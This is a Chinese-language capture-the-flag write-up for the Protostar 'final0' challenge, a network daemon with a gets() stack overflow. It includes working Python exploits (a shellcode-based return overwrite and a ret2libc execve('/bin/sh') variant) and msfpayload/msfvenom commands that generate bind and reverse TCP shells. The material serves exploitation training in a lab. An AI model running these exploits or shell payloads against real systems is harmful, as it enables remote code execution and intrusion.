# final0

## （一） 题目：

\#include "../common/common.c"

\#define NAME "final0"

\#define UID 0

\#define GID 0

\#define PORT 2995

/\*

\* Read the username in from the network

\*/

char \*get\_username\(\)

{

char buffer\[512\];

char \*q;

int i;

memset\(buffer, 0, sizeof\(buffer\)\);

gets\(buffer\);

/\* Strip off trailing new line characters \*/

q = strchr\(buffer, '\n'\);

if\(q\) \*q = 0;

q = strchr\(buffer, '\r'\);

if\(q\) \*q = 0;

/\* Convert to lower case \*/

for\(i = 0; i &lt; strlen\(buffer\); i++\) {

```
  buffer\[i\] = toupper\(buffer\[i\]\);
```

}

/\* Duplicate the string and return it \*/

return strdup\(buffer\);

}

int main\(int argc, char \*\*argv, char \*\*envp\)

{

int fd;

char \*username;

/\* Run the process as a daemon \*/

background\_process\(NAME, UID, GID\);

/\* Wait for socket activity and return \*/

fd = serve\_forever\(PORT\);

/\* Set the client socket to STDIN, STDOUT, and STDERR \*/

set\_io\(fd\);

username = get\_username\(\);

printf\("No such user %s\n", username\);

}

## （二）解题过程：

这道题比较简单，就是一个栈溢出，覆盖ret地址。

方法如下：

1）使用pattern\_create.rb工具定位，找到溢出点偏移位置

2）构造buffer溢出脚本，在偏移位置后面加 ret地址，用gdb调试看出错位置是不是这里

3）加shellcode

![](/png/90.png)

主要难点是shellcode的生成方法

msfvenom

msfpayload

\#msfpayload linux/x86/shell\_bind\_tcp R \| msfencode -b '\x00\xff\x0d\x0a' -e x86/shikata\_ga\_nai -t c

\#!/usr/bin/python

from socket import \*

from struct import \*

s = socket\(AF\_INET, SOCK\_STREAM\)

s.connect\(\("192.168.0.71", 2995\)\)

buffer = "a"\*532

ret = "\xEF\xBE\xAD\xDE"

nop = "\x90"\*20

\#msfpayload linux/x86/shell\_bind\_tcp R \| msfencode -b '\x00\xff\x0d\x0a' -e x86/shikata\_ga\_nai -t c

shellcode = "\xba\x5f\x74\xd6\x3c\xdb\xcd\xd9\x74\x24\xf4\x5e\x31\xc9\xb1"\

"\x14\x31\x56\x14\x03\x56\x14\x83\xc6\x04\xbd\x81\xe7\xe7\xb6"\

"\x89\x5b\x5b\x6b\x24\x5e\xd2\x6a\x08\x38\x29\xec\x32\x9b\xe3"\

"\x84\xc6\x23\x15\x08\xad\x33\x44\xe0\xb8\xd5\x0c\x66\xe3\xd8"\

"\x51\xef\x52\xe7\xe2\xeb\xe4\x81\xc9\x73\x47\xfe\xb4\xbe\xc8"\

"\x6d\x61\x2a\xf6\xc9\x5f\x2a\x41\x93\xa7\x42\x7d\x4c\x2b\xfa"\

"\xe9\xbd\xa9\x93\x87\x48\xce\x33\x0b\xc2\xf0\x03\xa0\x19\x72"

s.send\(buffer + ret + nop + shellcode\)

![](/png/91.png)

方法2： 另一种做法就是ret2libc的方法也可以实现（推荐）

写出的exploit比较稳定，不存在找不到shellcode入口地方。

from socket import \*

from struct import \*

import telnetlib

host = '10.14.110.37'

port = 2995

s = socket\(AF\_INET, SOCK\_STREAM\)

s.connect\(\(host,port\)\)

pad = 'a'\*510+'\x00'+'b'\*21

execve = pack\("I", 0x08048c0c\)

binsh = pack\("I",0xb7e97000+1176511\)

exp = pad + execve + "AAAA" + binsh + "\x00"\*8

s.send\(exp+'\n'\)

s.send\("id\n"\)

print s.recv\(1024\)

t = telnetlib.Telnet\(\)

t.sock = s

t.interact\(\)

运行结果如下：

![](/png/92.png)

生成shellcode方法：

```
# msfvenom -p linux/x86/shell_reverse_tcp LHOST=172.16.184.1 LPORT=4444 -a x86 --platform linux -b '\x00\x0a\x0d' -f python
```

```
# Found 10 compatible encoders
```

\#msfpayload linux/x86/shell\_bind\_tcp R \| msfencode -b '\x00\xff\x0d\x0a' -e x86/shikata\_ga\_nai -t c

第三种方法 ret2text

[http://www.pwntester.com/blog/2013/12/26/protostar-final0-3-write-ups/](http://www.pwntester.com/blog/2013/12/26/protostar-final0-3-write-ups/)

ref:

[http://www.voidcn.com/article/p-dnsxpzhd-xo.html](http://www.voidcn.com/article/p-dnsxpzhd-xo.html)

[https://www.freebuf.com/news/182894.html](https://www.freebuf.com/news/182894.html)

[http://www.atomsec.org/游戏/protostar-final0-write-up/](http://www.atomsec.org/游戏/protostar-final0-write-up/)        \(推荐）

[https://bbs.pediy.com/thread-191433.htm](https://bbs.pediy.com/thread-191433.htm)

[http://shell-storm.org/shellcode/files/shellcode-836.php](http://shell-storm.org/shellcode/files/shellcode-836.php)

